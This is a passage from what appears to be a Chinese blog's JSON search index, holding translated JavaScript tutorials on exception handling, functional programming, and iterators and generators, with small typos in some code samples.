http://nikgrozev.com/2017/10/01/async-await/","link":"/posts/efa9d1a1.html"},{"title":"异常及同步&#x2F;异步代码异常处理最佳实践","text":"How JavaScript works: exceptions + best practices for synchronous and asynchronous code 原文请查阅这里。 概述在计算中，错误检测是一种在程序执行过程中实现可靠流的技术。 错误检测的一种方法是错误检查。此方法通过一连串的显式检查异常来维护正常的程序流，使用特定的返回值，辅助全局变量或浮点状态标志来报告异常。 异常指的是在程序运行过程中发生的影响程序流的异常事件。这种中断会触发预注册的异常处理程序的执行。 在软件和硬件层上都可能发生异常。 JavaScript 中的异常一个 JavaScript 应用程序有可能在不同的操作系统，浏览器+插件和设备上运行。无论开发者编写了多少测试，这种不确定性性的环境最终都很有可能会导致错误。 从最终使用者的角度上看，JavaScript 只是通过静默失败来处理错误。但底层的处理机制其实比想象中复杂。 A JavaScript code throws an exception when a particular statement generates an error. Instead of executing the next code statement, the JavaScript engine checks for the existence of exception handling code. 当特定语句生成错误时，JavaScript 代码将引发异常。JavaScript 引擎将检查是否存在异常处理代码，而不是执行下一个代码语句。 如果未定义异常处理程序，则引擎从抛出异常的函数返回。对于调用栈上的每个函数会重复执行此过程直到发现异常处理程序为止。如果调用栈上已经没有函数时仍未找到异常处理程序，那么事件循环会将回调队列上的下一个函数推入栈中。 异常发生时，将创建并抛出一个错误对象(Error Object)。 错误对象的种类JavaScript中有九种类型的内置错误对象，它们是异常处理的基础： Error - 表示通用异常, 最常用于实现用户自定义异常。 EvalError - eval() 函数使用不当时发生。 RangeError - 用于数值型变量或参数超出其有效范围时发生的错误。 ReferenceError - 当访问不存在的变量时发生的引用异常。 SyntaxError - 语法异常。JavaScript 语法规则被破坏时发生。对于静态类型的语言，会在编译时发生。而在 JavaScript中，此异常发生在运行时。 TypeError - 当值与预期类型不匹配时发生。调用不存在的对象方法是此类异常的常见原因。 URIError - 当 encodeURI() 和 decodeURI() 遇到格式错误的URI时发生。。 AggregateError - 当多个错误​​需要包装在一个错误中时，该对象表示一个错误。比如 Promise.any()。 InternalError - 在 JavaScript 引擎中引发内部错误时发生。比如太多的递归导致栈溢出。在撰写本文时，此API尚未标准化。 开发者可以通过继承一些内置错误类型来定义自定义错误类型。 异常抛出JavaScript 允许开发者通过 throw 语句主动抛出异常。 123if (denominator === 0) { throw new RangeError(\"Attempted division by zero\");} 所有内置错误对象都有一个可选的 message参数，用于提供了人类可读的错误描述。 注意: 可以抛出任何类型的对象作为异常，例如数字，字符串，数组等。 1234567throw true;throw 113;throw 'error message';throw null;throw undefined;throw {x: 1};throw new SyntaxError('hard to debug'); 以上都属于有效的 JavaScript 语句。 异常处理现在，我们将了解如何确保异常不会使应用程序崩溃。 try 子句和其他编程语言一样, JavaScript有 try，catch，finally语句，使开发者可以控制代码中的异常流。 举个例子： 12345678910try { // a function that potentially throws an error someFunction();} catch (err) { // this code handles exceptions console.log(e.message);} finally { // this code will always be executed console.log(finally’);} try 语句是强制性的，并包含着可能引发错误的代码块。 catch 子句它后面紧跟着的 catch块包装了处理错误的 JavaScript 代码。 catch子句阻止异常在调用栈中传播，并允许应用程序流继续进行。错误本身作为参数传递给catch子句。 通常，某些代码块会引发不同种类的异常，并且应用程序应该会根据异常的不同采取不同的处理。 JavaScript 的 instanceof 运算符，可用于区分异常类型： 1234567891011121314151617try { If (typeof x !== ‘number’) { throw new TypeError(‘x is not a number’); } else if (x &lt;= 0) { throw new RangeError(‘x should be greater than 0’); } else { // Do something useful }} catch (err) { if (err instanceof TypeError) { // Handle TypeError exceptions } else if (err instanceof RangeError) { // Handle RangeError exceptions } else { // Handle all other types of exceptions }} 一种有效使用场景是重新抛出已捕获的异常。例如在上下文中捕获到类型无关紧要的。 finally 子句无论最终是否有异常，都会在try和catch子句之后执行finally代码块。finally对于包含清理代码（例如关闭WebSocket连接或其他资源）的执行非常有帮助。 请注意，即使未捕获到抛出的异常，finally 块也会执行。然后引擎继续按顺序遍历调用栈中的函数，直到正确处理异常或应用程序被终止。 还要注意的另外一点是，即使try或catch块执行了return语句，也会执行finally块。 请看下面的例子： 1234567function foo1() { try { return true; } finally { return false; }} 通过调用foo1()函数，即使try块具有return语句，我们也会得到false。 如果在catch块中有return语句，此规则同样适用： 123456789function foo2() { try { throw new Error(); } catch { return true; } finally { return false; }} 调用foo2()函数, 同样会返回false。 异步代码的异常处理我们在这不再赘述异步编程, 但我们将介绍如何通过回调函数，Promise 和 async/await 来处理异常。 async/await首先我们来定义一个抛出异常的异步函数。 123async function foo() { throw new Error();} 当在异步函数中抛出错误时，将与异常一起返回一个已拒绝的promise，等同于： 1return Promise.Reject(new Error()) 让我们看看调用foo()时会发生什么： 1234567try { foo();} catch(err) { // This block won’t be reached.} finally { // This block will be reached before the Promise is rejected.} 由于foo()是异步的，因此将触发Promise。该代码不等待异步函数，因此此时并没有任何实际异常被捕获。随后finally块执行，然后Promise拒绝。 此时的我们没有任何代码处理被拒绝的Promise。 可以通过在调用foo()时添加await关键字并将代码囊括在异步函数中来解决： 12345678910async function run() { try { await foo(); } catch(err) { // This block will be reached now. } finally { // This block will be reached at the end. }} run(); Promises让我们定义一个在Promise之外引发错误的函数。 123456789function foo(x) { if (typeof x !== 'number') { throw new TypeError('x is not a number'); } return new Promise((resolve, reject) =&gt; { resolve(x); });} 现在，我们使用字符串作为参数来调用foo()而不是数字： 123foo('test') .then(x =&gt; console.log(x)) .catch(err =&gt; console.log(err)); 由于Promise 无法捕获到Promise之外引发的异常，所以这会产生Uncaught TypeError: x is not a number的报错。 要捕获此类错误，需要使用标准的try和catch子句： 1234567try { foo('test') .then(x =&gt; console.log(x)) .catch(err =&gt; console.log(err));} catch(err) { // Now the error is handed} 如果将foo修改为在Promise中抛出错误： 12345678function foo(x) { return new Promise((resolve, reject) =&gt; { if (typeof x !== 'number') { throw new TypeError('x is not a number'); } resolve(x); });} 这样Promise里的catch语句也是能正确处理异常的。 1234567try { foo(‘test’) .then(x =&gt; console.log(x)) .catch(err =&gt; console.log(err)); // The error is handled here.} catch(err) { // This block is not reached since the thrown error is inside of a Promise.} 要注意的是在Promise中抛出错误与使用reject回调相同。因此最好这样定义foo： 12345678function foo(x) { return new Promise((resolve, reject) =&gt; { if (typeof x !== 'number') { reject('x is not a number'); } resolve(x); });} 如果Promise中没有catch方法来处理错误，则回调队列中的下一个函数将添加到栈中。 回调函数使用错误优先回调方法有两个主要规则： 回调的第一个参数用于错误对象。如果发生错误，它将由第一个err参数返回。如果未发生错误，则err将设置为null。 回调的第二个参数为结果, 即响应数据。 12345678910function asyncFoo(x, callback) { // Some async code...}asyncFoo(‘testParam’, (err, result) =&gt; { If (err) { // Handle error. } // Do some other work.}); 如果有错误对象，最好不要去动结果参数。 处理未处理的异常如果应用程序使用了第三方库，则无法控制它们如何处理异常。在某些情况下，您可能希望能够处理未处理到的异常。 浏览器浏览器暴露了一个window.onerror的事件处理器可用于此。 使用方法如下： 1234window.onerror = (msg, url, line, column, err) =&gt; { // ... handle error … return false;}; 参数： msg-与错误相关的信息，例如Uncaught ReferenceError: foo is not defined。 url-与错误关联的脚本或文档的地址。 lineNo-行号（如果存在的话）。 columnNo-列号（如果存在的话）。 msg-与错误相关的Error对象（如果存在的话）。 当函数返回true时，这将防止触发默认事件处理程序。 注意只能将一个事件处理程序分配给window.onerror，因为这是函数分配，一次只能将一个函数分配给一个事件。 这意味着，如果您分配自己的window.onerror，则将覆盖第三方库可能分配的所有以前的处理程序。这可能是一个巨大的问题，尤其是对于错误跟踪器之类的工具而言，因为它们很可能会完全停止工作。 开发者可以使用以下技巧轻松解决此问题。 123456789var oldOnErrorHandler = window.onerror;window.onerror = (msg, url, line, column, err) =&gt; { If (oldOnErrorHandler) { // Call any previously assigned handler. oldOnErrorHandler.apply(this, arguments); } // The rest of your code} 上面的代码检查是否存在先前定义的window.onerror，并在继续操作之前简单地调用它。使用此模式，您可以继续添加其他处理程序。 这种方法在浏览器间高度兼容（即使是IE6）。 另一种不需要替换异常处理程序的方法是将事件侦听器添加到window对象： 1234window.addEventListener('error', e =&gt; { // Get the error properties from the error event object const { message, filename, lineno, colno, error } = e; }); 这种方法要好得多，并且从IE9开始得到了广泛支持。 Node.jsEvent Emmiter模块中的process对象提供了两个用于处理错误的事件。 uncaughtException : 当未捕获的异常一直冒泡至事件循环时触发。 默认情况下，Node.js通过将堆栈跟踪打印到stderr并使用code 1退出来处理此类异常。 为此事件添加处理程序将覆盖默认行为。该事件的正确用法是在关闭进程之前执行分配资源的同步清理（例如文件描述符，句柄等）。此后恢复正常运行的行为是不安全的。 unhandledRejection : 每当Promise被拒绝且在事件循环内没有错误处理程序附加到Promise时触发。 unhandledRejection事件对于检测和跟踪已拒绝的Promise以及尚未处理的reject很有用。 12345678process .on('unhandledRejection', (reason, promise) =&gt; { // Handle failed Promise }) .on('uncaughtException', err =&gt; { // Handle failed Error process.exit(1); }); 在代码中妥善处理错误，这一点非常重要。了解未处理的错误同样重要，这样就可以确定优先级并相应地进行处理。 参考资源 https://www.sitepoint.com/exceptional-exception-handling-in-javascript/#:~:text=When%20a%20JavaScript%20statement%20generates,whatever%20function%20threw%20the%20exception. https://www.tutorialspoint.com/es6/es6_error_handling.htm https://www.javascripttutorial.net/es6/promise-error-handling/","link":"/posts/f2e24d63.html"},{"title":"函数式编程及与其他范式对比","text":"How JavaScript works: functional style and how it compares to other approaches 原文请查阅这里 概述在此之前，已经有程序员使用逻辑式，过程式以及最常见的面向对象范式来编写代码。这些范式涵盖了用于解决计算问题的编码风格，框架，特性和模式，也有助于各种编程语言的发展。 比如过程式语言（COBOL）是基于过程式原理，即每个语句可被解释为子程序或函数。 另一方面，函数式编程是本文的基石，涉及到项目构建，问题解决或使用数学函数来处理计算。我们将使用数据作为“输入”的函数来编写代码，该数据经过函数计算并作为“输出”返回。 函数式编程的美丽之处在于这些函数无法更改我们的数据或输入（数据不可变性）并可以观察到任何副作用。语句以函数来表示：接受输入，产生输出。 本文将讨论更多有关函数式编程的内容，包括它如何在 JavaScript 中工作以及一些重要概念，以便更好理解 JavaScript 中的函数式编程。 JavaScript 面向对象概述毋庸置疑 JavaScript 是基于原型的语言，而不是基于类，并且 JavaScript 开发者经常会混淆或误解此模型。基于类的语言（例如C＃，Java等）在两个主要概念：类和实例。类定义了该对象在实例化时应该具有的所有属性。 在 JavaScript 中，引入的 OOP 语法使其看起来是面向对象，但实际上并非如此。这意味着当开发者使用类语法创建对象时，它会自动获取其原型。另外，如果有不存在的方法或属性，JavaScript 将检查原型以查看其是否存在（原型链）。 让我们看一个代码示例，该例子说明 JavaScript 中的 class 语法： 12345678910let Person = class { constructor(name, age) { this.name = name; this.age = age; } speak() { return `Hello, my name is ${this.name} and I am ${this.age}` }} 请注意，Person 类具有一个有两个参数的构造函数。this 关键字指向属性 Person。 方法 speak() 可以在以下创建新示例的例子中一样使用： 12let victor = new Person('Victor', 23);console.log(victor.speak()); new Person 调用构造函数，并传入将设置至 victor 对象的参数。在底层方法 speak() 将被添加至构造函数的原型中。 同样，我们可以基于 Person 类创建一个新的类，以扩展其中已存在的属性和方法。如下： 12345678910111213let Work = class extends Person { constructor(name, age, work) { super(name, age); this.work = work } getInfo() { return `Hey! It's ${this.name}, I am age ${this.age} and work for ${this.work}.` }}let alex = new Work('Alex', 30, 'SessionStack');console.log(alex.getInfo()); 这样我们就创建了一个对象并将其扩展以定义更多属性。在基于类的编程语言中，这种概念称为子类。 那么在 JavaScript 旧语法中是应该实现呢？ 记住 class 语法在底层仍然只是制作原型。一起来看下面这个例子： 1234567891011let Person = function(name, age) { this.name = name; this.age = age;}Person.prototype.speak = function() { return `Hello, my name is ${this.name} and I am ${this.age}`}let victor = new Person(`Victor`, 23)console.log(victor.speak()) 上面的代码中，我们调用方法 Person(), 注意方法前的 new 关键字改变了函数的上下文从而调用了构造函数。基于 Person 对象创建的示例返回并赋值给 victor。 就像在上面 Work 扩展 Person 类语法那样扩展对象，可以与以原型方法完成： 1234let Work = function(name, age, work) { Person.call(this, name, age); this.work = work;} 注意我们并没有使用 super() 关键字因为它并不存在与 JavaScript 原型上下文中。call() 方法接收 this 和参数，并将 Person 的属性添加到 Work 。call() 方法将构造函数从 Person 链接到 Work，换句话说，我们从 Person 借用属性并将其添加到 Work 上。 同样的，class 语法里的 extend 关键字也不是原型的一个属性。然而 Person 和 Work 可以通过以下方式连接： 1Object.setPropertyOf(Work.prototype, Person.prototype); Work 原型现在将使用 Person 原型。下面的例子是向新原型Work中添加方法： 123456Work.prototype.getInfo = function() { return `Hey! It's ${this.name}, I am age ${this.age} and work for ${this.work}.`}let alex = new Work(\"Alex\", 40, 'SessionStack');console.log(alex.getInfo()); 现在我们应当更了解基于类和基于原型的概念。应该清楚的是 JavaScript 是一种基于对象的语言，它通过原型链接起来。大多数开发者使用的类语法只是 ES6 的语法糖。 通过这基本概述，现在我们可以继续介绍 JavaScript 中的函数式编程了。 什么是 JavaScript 函数式编程？对于大多数开发者来说，在 JavaScript 中使用函数式编程的思想似乎会更轻松。为什么？众所周知，JavaScript 是一门基于原型的语言，而这些 prototype inheritance，this，setPropertyOf和其他确实令人困惑，而且大多都被被误解。 不过，与在基于原型的编码中使用错误的 this 绑定相比，我们有 JavaScript 的函数式方法使工作变得更简单，更少的 bug且易于维护。 使用函数式编程思想的 JavaScript 开发者社区很大，并且大多数库都允许在项目中使用这种范式。这意味着在遇到问题时，StackOverflow 或其他任何地方都将提供足够的帮助。 JavaScript 中的函数式代码如下： 1234567const sayHello = function(name) { return `Hello ${name}`;}sayHello('Victor');# =&gt; Hello Victor 我们声明了一个带有参数 name 的函数，当该函数被调用时，如果参数值是 Victor，则返回字符串 Hello Victor。这是使用函数编写代码时一种更简洁的自解释方法。 要了解 JavaScript 函数式编程的更多信息，需要了解某些重要的概念比如：纯函数，高阶函数，不变性，一等函数等。我们还将在本文中讨论它们。 JavaScript 函数式编程中的概念纯函数函数编程式的一个主要目标是 – 避免副作用并使用纯函数。避免副作用意味着函数应仅通过接受参数（输入）并对其进行处理来进行计算。函数应该是纯粹的。让我们看一个具有副作用的非纯函数示例。 12345let surname = 'Jonah';const sayHi = function() { return `Hi ${surname}`;} 上面代码中的函数没有输入（参数），但从函数外部接收到一个全局变量 surname。这可能会产生副作用。 纯函数代码实例应当如下： 123const sayHi = function(surname) { return `Hi ${surname}`;} 函数仅关心输入的 surname 并将对进行计算。这就是纯函数。当谈到函数式编程时，这是主要且最重要的概念。 高阶函数围绕这个概念，我们将更好地理解函数式编程的风格。高阶函数是将函数作为参数或返回函数的函数。请记住，函数是值，这意味着可以传递这些值。例如： 12345const getSum = function(num) { return num + num;}getSum(9); 我们创建了一个函数并将其分配给变量 getSum，现在我们可以将变量传递给另一个值（变量）。像这样： 123const addNum = getSum;addNum(9); 我们可以继续将函数（值）传递到另一个函数中，以帮助我们编写或将许多较小的函数引入较大的函数。这就产生了组合。 1234567891011121314function a(x) { return x * 2;}function b(x) { return x + 1;}function c(x) { return x * 3;}const d = c(b(a(2)));console.log(d) // 15 我们可以传递每个函数返回的值，并将其传递给下一个函数。这就是我们使用高阶函数的原因，因为它可以进行组合，使我们的代码更整洁且具有鲁棒性。 数组的 filter() 方法是最常用的高阶函数示例之一。当另一个函数作为参数传递时，此法为我们生成一个新数组。例如： 123456789function isLarge(value) { return value &gt; 10;}const dataArray = [10, 11, 12, 3, 4];const filteredArray = dataArray.filter(isLarge);console.log(filteredArray); // [11, 12] filter() 方法遍历数组 dataArray, 每个元素都将作为参数传入回调函数 isLarge。 回调函数应当返回一个布尔值。如果为 true, 值就会被添加至新数组。这简单又不失优雅。其他受欢迎的示例还有是 map() 和 reduce()。我们不需要在这里任何地方使用 for 循环。在界山下一个概念之前，让我们看一下 map() 的一个例子： 123456789function squareRoot(value) { return Math.sqrt(value)}const dataArray = [4, 9, 16];const mappedArray = dataArray.map(squareRoot);console.log(mappedArray); // [2, 3, 4] 不变性函数式编程中的另一个概念是强调了避免改变的重要性。当我们说 mutation 时，我们的意思是改变状态或数据。因此，当某些东西是不可变的，一旦它被设置，它就保持不变，而当我们要进行更改时，我们使用新更改的数据来设置一个新对象。让我们来看下面的代码： 12345let data = [1, 2, 3, 4, 4];data[4] = 5;console.log(data); // [1, 2, 3, 4, 5] 请注意，我们如何将数据从 1、2、3、4、4 更改为 1、2、3、4、5，这看起来并不好，因为我们可能在代码中引入错误。想象一下我们在代码库中的某个位置计算了数据数组，并且在这时已经被更改，使用函数式编程是可以避免这种情况的。那么，不变性如何在 JavaScript 中起作用？下面我用代码来解释一下。 123const names = [\"Alex\", \"Victor\", \"John\", \"Linda\"]const newNamesArray = names.slice(1, 3) // [\"Victor\", \"John\"] 原来的数组 name 没有被修改，并且返回了新数组。 对象也可以使用方法 Object.freeze() 变成不可变。此方法冻结对象并使其不允许删除数据或添加到对象属性。比如： 123456789101112131415const employee = { name: \"Victor\", designation: \"Writer\", address: { city: \"Lagos\" }};Object.freeze(employee);employee.name = \"Max\"//Outputs: Cannot assign to read-only property 'name'//Checks if our object is immutable or notObject.isFrozen(employee); // === true 这样对象变得不可变并且不会受到干扰，这绝对是我们期待的结果。 不变性一直存在一个问题，即当需要更改时，必须一遍又一遍地复制数组。比如有一个包含 1000 个子元素的 names 数组，并且我们需要不断对其进行修改并创建新数组，那么最终可能会占用过多内存，从而出现时间复杂度或持久化的问题。当然社区也存在解决方案，并有对应的 JavaScript 库比如immutable.js和Mori，但本文不对此进行拓展。 通过这几个概念应该可以了解到 JavaScript 函数式编程的思想和美。我们可以看到代码更具可读性和简洁性，可用于执行快速和可操作的流程如数据处理和并发。 声明式与命令式 JavaScriptJavaScript 不仅可以进行函数式编程，还可以采用声明式和命令式方法编写代码。我们直接来命令式方法的代码风格。命令式方法像是陈述解决问题所需的所有步骤。例如，如果想吃意大利面，那么必要的步骤如下： 煮意大利面 混合原料 蒸意大利面及原料 混合酱料 我确信使用这些步骤来会得到差劲的面食，但重点是使用了命令式方法来实现。 而声明式方法只是声明或说出想做什么。比如要煮意大利面，仅此而已。当涉及到声明式方法时，不需要表达控制流。这是两种方法的简单描述用于对比它们之间的差异，而不要指导开发者该使用其中的某一种。 ### JavaScript 中的命令式方法： 这里我们将直接告诉计算机明确的对应操作。 1234567891011121314// Function to filter an array; return greater than 5 numbersconst filterArray = (array) =&gt; { let filteredArray = []; for(let i = 0; i &lt; array.length; i++) { if(array[i] &gt; 5) { filteredArray.push(array[i]); } } return filteredArray;}const array = [1, 2, 3, 4, 5, 6, 7, 8]filterArray(array) 与其告诉计算机想要什么，我们只是逐步说明要实现的目标。步骤包括： 声明一个空数组 遍历给定数组 if/else，如果数值大于5 将通过测试的元素推入先前声明的空数组中 显示新数组 ### JavaScript 中的声明式方法： 1234567// Filter method to give us a new arrayconst filterArray = array =&gt; array.filter(x =&gt; x &gt; 5);const array = [1, 2, 3, 4, 5, 6, 7, 8];console.log(filterArray(array)); // [6, 7, 8] 函数式编程的优势开发人员选择函数式编程的常见原因有几个。虽然对初学者来说会比较棘手，但是当掌握这些概念时，它也会变得更加容易。主要原因如下： 为我们的代码库提供了模块化；功能之间可以结合甚至分离。它将函数视为值，使我们可以将函数作为参数传递。这也提供了代码可复用性，其中函数是可组合的（被视为组件），如 React 一样。 调试更加容易：更少的 bug 和更轻松的维护。高阶函数可以更安全地进行编程，因为它更容易调试和维护更少的代码。 任何开发人员都可以快速阅读和理解您的代码。因为编写的是你直观的想法，而不是计算机该如何替你思考。 函数式编程中开发者可以更快地编写整洁的代码。用高阶函数 map()，filter() 替换 for 循环之类的迭代代码会带来简洁性。 结论本文通过一些示例对 JavaScript 面向对象的工作方式进行了基本概述，及 class 语法（语法糖）和基于原型的 JavaScript 间的区别。还了解了 ES6 类语法仍然在底层实现了基于原型的语法。 JavaScript 中的一些函数式编程概念，可以帮助开发者更好地判断是否选择这种范式。纯函数是这种范式的重中之重。我们还介绍了声明式和命令式方法及对应的代码示例。 编程范式没有孰是孰非，本文也不是对此的辩论而旨在介绍函数式编程的概念以助你更好的理解。 更多关于函数式编程的内容 Why Functional programming matters An introduction to functional programming in JavaScript Master the Coding interview: What is functional programming","link":"/posts/2819cdc2.html"},{"title":"迭代器及生成器高阶控制技巧","text":"How JavaScript works: iterators + tips on gaining advanced control over generators 原文请查阅这里。 概述无论在什么编程语言种，处理集合中的每个项是很常见的操作。JavaScript 也不例外，它提供了许多迭代集合的方法，从简单的 for 循环到更复杂的 map() 和 filter()等。 迭代器和生成器将迭代的概念直接带入语言核心，并提供了一种自定义 for...of 循环的行为的机制。 迭代器在 JavaScript 中，迭代器是一个对象，它定义一个序列，并在终止时可能返回一个返回值。 迭代器可以是实现Iterator接口的任意对象。这意味着它必须有一个 next() 方法，该方法会返回一个具有以下两项属性的对象： 更具体地说，迭代器是通过使用 next() 方法实现 Iterator protocol 的任何一个对象，该方法返回具有两个属性的对象： value，这是序列中的 next 值；和 done ，如果已经迭代到序列中的最后一个值，则它为 true 。如果 value 和 done 一起存在，则它是迭代器的返回值。 value： 序列中的 next 值 done：如果已经迭代到序列中的最后一个值，则它为 true 。如果 value 和 done 同时存在，则它是迭代器的返回值。 一旦创建，迭代器对象可以通过重复调用 next()显式地迭代。在终止值产生后，对 next()的额外调用应该继续返回 {done：true}。 使用可能有时需要很多资源才能为数组分配值并遍历每个值。迭代器则只在必要时使用。这为迭代器遍历无限大小的序列提供了可能性。 这是一个创建简单的迭代器的示例，该迭代器生成斐波那契数列： 12345678910111213141516171819function makeFibonacciSequenceIterator(endIndex = Infinity) { let currentIndex = 0; let previousNumber = 0; let currentNumber = 1; return { next: () =&gt; { if (currentIndex &gt;= endIndex) { return { value: currentNumber, done: true }; } let result = { value: currentNumber, done: false }; let nextNumber = currentNumber + previousNumber; previousNumber = currentNumber; currentNumber = nextNumber; currentIndex++; return result; } makeFibonacciSequenceIterator 开始生成斐波那契数，在到达 endIndex 时停止。迭代器在每次迭代时返回当前的斐波那契数，并在完成后继续返回最后生成的数。 这是通过上面的迭代器生成斐波那契数的输出： 123456let fibonacciSequenceIterator = makeFibonacciSequenceIterator(5); // Generates the first 5 numbers.let result = fibonacciSequenceIterator.next();while (!result.done) { console.log(result.value); // 1 1 2 3 5 8 result = fibonacciSequenceIterator.next();} 定义可迭代上述例子中迭代器的创建可能会产生某些问题因为没有办法事先校验这是否是一个有效迭代器。你可能会说返回的对象不是包含 next() 方法可以用来验证，但也存在一些非迭代对象本身就定义了 next() 。 这也是为什么 JavaScript 在定义一个可迭代对象时有更多要求的原因。 上面的斐波那契例子不会被 JavaScript 判断为一个可迭代对象。开发者可以用 for...of 循环对其进行遍历来测验。 12345let fibonacciSequenceIterator = makeFibonacciSequenceIterator(5);for (let x of fibonacciSequenceIterator) { console.log(x);} 上面代码会抛出异常 Uncaught TypeError: fibonacciSequenceIterator is not iterable 。 一些内置类型，如 Array 或 Map 拥有默认的迭代行为，而其他类型（比如Object）则没有。 为了实现可迭代，一个对象必须实现 @@iterator 方法，这意味着这个对象（或其原型链中的任意一个对象）必须具有一个带 Symbol.iterator 键（key）的属性。属性的定义是一个返回待迭代元素的函数 让我们来来看看在斐波那契例子中应该进行如何的改造： 1234567891011121314151617181920212223function makeFibonacciSequenceIterator(endIndex = Infinity) { let currentIndex = 0; let previousNumber = 0; let currentNumber = 1; let iterator = {}; iterator[Symbol.iterator] = () =&gt; { return { next: () =&gt; { if (currentIndex &gt;= endIndex) { return { value: currentNumber, done: true }; } const result = { value: currentNumber, done: false }; const nextNumber = currentNumber + previousNumber; previousNumber = currentNumber; currentNumber = nextNumber; currentIndex++; return result; } } }; 现在我们可以用 for...of 循环对其进行遍历了。 12345let fibonacciSequenceIterator = makeFibonacciSequenceIterator(5);for (let x of fibonacciSequenceIterator) { console.log(x); //1 1 2 3 5 8} 生成器自定义迭代器非常有用，在某些场景下能极大提高效率，但由于需要显式地维护其内部状态，因此需要谨慎地创建及维护代码。 生成器函数提供另一种强大的思路：它允许你定义一个包含自有迭代算法的函数，同时它可以自动维护自己的状态。生成器函数使用 function* 语法。 调用时，生成器函数在一开始不会执行其代码。相反，它们返回一种特殊的迭代器类型，称为生成器。当通过调用生成器的 next 方法消耗一个值时，Generator 函数将一直执行直到遇到 yield 关键字。 一个生成器可以视为连续调用的生成一系列值的函数而返回单个值的函数。 生成器的语法包括一个称为 yield 的运算符，该运算符允许函数暂停直到请求下一个值。 1234567891011121314151617function* makeFibonacciSequenceGenerator(endIndex = Infinity) { let previousNumber = 0; let currentNumber = 1; for (let currentIndex = 0; currentIndex &lt; endIndex; currentIndex++) { yield currentNumber; let nextNumber = currentNumber + previousNumber; previousNumber = currentNumber; currentNumber = nextNumber; }}let fibonacciSequenceGenerator = makeFibonacciSequenceGenerator(5);for (let x of fibonacciSequenceGenerator) { console.log(x);} 可以看出生成器语法更易于实现和维护。 生成器高阶控制迭代器显式定义 next() 函数，以便通过 JavaScript 实现需要的接口。使用生成器时，将隐式添加 next() 函数，但该函数仍然存在。这就是生成器生成有效的可迭代对象的方式。 生成器隐式定义的 next() 函数接受可用于修改内部状态的参数。传递给 next() 的值将被 yield 语句接收。 让我们进一步修改斐波那契示例，以便控制在遍历序列的每个步骤中可以控制跳过多少个数字： 1234567891011121314151617181920212223function* makeFibonacciSequenceGenerator(endIndex = Infinity) { let previousNumber = 0; let currentNumber = 1; let skipCount = 0; for (let currentIndex = 0; currentIndex &lt; endIndex; currentIndex++) { if (skipCount === 0) { skipCount = yield currentNumber; // skipCount is the parameter passed through the invocation of `fibonacciSequenceGenerator.next(value)` below. skipCount = skipCount === undefined ? 0 : skipCount; // makes sure that there is an input } else if (skipCount &gt; 0){ skipCount--; } let nextNumber = currentNumber + previousNumber; previousNumber = currentNumber; currentNumber = nextNumber; }}let fibonacciSequenceGenerator = makeFibonacciSequenceGenerator(50);console.log(fibonacciSequenceGenerator.next().value); // prints 1console.log(fibonacciSequenceGenerator.next(3).value); // prints 5 since 1, 2, and 3 are skipped. 请注意，传递给 next() 首次调用的参数始终会被忽略。 另一个重要功能是能够通过调用生成器的 throw() 方法传递应抛出的异常值来强制生成器抛出异常。调用后将从生成器的当前挂起上下文中抛出此异常，就好像当前挂起的 yield 语句会被 throw 代替。 如果异常未在生成器中被捕获，它将通过 throw() 的外部调用向上传播，随后对 next() 的调用将导致 done 属性设为 true。让我们看下面的例子： 123456789101112131415161718192021222324252627282930function* makeFibonacciSequenceGenerator(endIndex = Infinity) { let previousNumber = 0; let currentNumber = 1; let skipCount = 0; try { for (let currentIndex = 0; currentIndex &lt; endIndex; currentIndex++) { if (skipCount === 0) { skipCount = yield currentNumber; skipCount = skipCount === undefined ? 0 : skipCount; } else if (skipCount &gt; 0){ skipCount--; } let nextNumber = currentNumber + previousNumber; previousNumber = currentNumber; currentNumber = nextNumber; } } catch(err) { console.log(err.message); // will print ‘External throw’ on the fourth iteration. }} let fibonacciSequenceGenerator = makeFibonacciSequenceGenerator(50);console.log(fibonacciSequenceGenerator.next(1).value);console.log(fibonacciSequenceGenerator.next(3).value);console.log(fibonacciSequenceGenerator.next().value);fibonacciSequenceGenerator.throw(new Error('External throw'));console.log(fibonacciSequenceGenerator.next(1).value); // undefined will be printed since the generator is done. 也可以通过调用返回给定值的 return(value) 方法来终止生成器： 1234567let fibonacciSequenceGenerator = makeFibonacciSequenceGenerator(50);console.log(fibonacciSequenceGenerator.next().value); // 1console.log(fibonacciSequenceGenerator.next(3).value); // 5console.log(fibonacciSequenceGenerator.next().value); // 8console.log(fibonacciSequenceGenerator.return(374).value); // 374console.log(fibonacciSequenceGenerator.next(1).value); // undefined 异步生成器可以在异步上下文中定义并使用生成器。异步生成器可以异步生成一系列值。 语法非常直接。关键字 async 需要位于生成器的 function* 前。 当遍历生成的序列时，需要在 for…of 构造中使用 await 关键字。 我们将再次修改斐波那契示例，使其根据预定义超时来生成序列： 123456789101112131415161718async function* makeFibonacciSequenceGenerator(endIndex = Infinity) { let previousNumber = 0; let currentNumber = 1; for (let currentIndex = 0; currentIndex &lt; endIndex; currentIndex++) { await new Promise(resolve =&gt; setTimeout(resolve, 1000)); // a simple timeout as an example. yield currentNumber; let nextNumber = currentNumber + previousNumber; previousNumber = currentNumber; currentNumber = nextNumber; }}(async () =&gt; { const fibonacciSequenceGenerator = makeFibonacciSequenceGenerator(6); for await (let x of fibonacciSequenceGenerator) { console.log(x); // 1, then 1, then 2, then 3, then 5, then 8 (with delay in between). } 由于生成器是异步的，因此我们可以内部使用 await，依赖 promise 执行网络请求等异步操作。这里生成器的 next() 方法返回一个 Promsie。 如果出于某种原因不想使用生成器但又想定义一个可迭代的对象，则必须使用 Symbol.asyncIterator 而不是上面的 Symbol.iterator。 尽管与迭代器相比，生成器更易于创建和维护，但与普通函数相比，它们会更难调试。在异步上下文中尤其如此。可能有很多原因。一个例子是假如在外部调用 throw() 方法时，栈跟踪作用可能非常有限。在这种情况下几乎不可能正常调试，开发者可能需要要求用户提供更多的信息。 参考资源 https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Iterators_and_Generators https://blog.bitsrc.io/explore-iterators-and-generators-in-javascript-ea4102015377","link":"/posts/98cc9fa3.html"},{"title":"探索网络层及优化其性能和安全性","text":"原文请查阅这里，略有改动。 正如在之前关于渲染引擎的文章中所讲，我们相信好的和伟大的 JavaScript 开发者之间的差别在于后者不仅仅只是理解了语言的具体细节还了解其内部构造和运行环境。 网络简史49 年前，ARPAnet 诞生了。它是早期的报文分组交换网络及第一个实现 TCP/IP 协议套件的网络。该网络连通了加利福亚大堂学和斯坦福研究所。20 年后，Tim Berners-Lee 发布了一个后来为人所熟知的万维网的 『Mesh』草案。49 年间，网络走过了一段漫长的旅程，从仅仅只是两台电脑间交换数据报文到 7500 万台服务器，3.8 亿人使用互联网以及 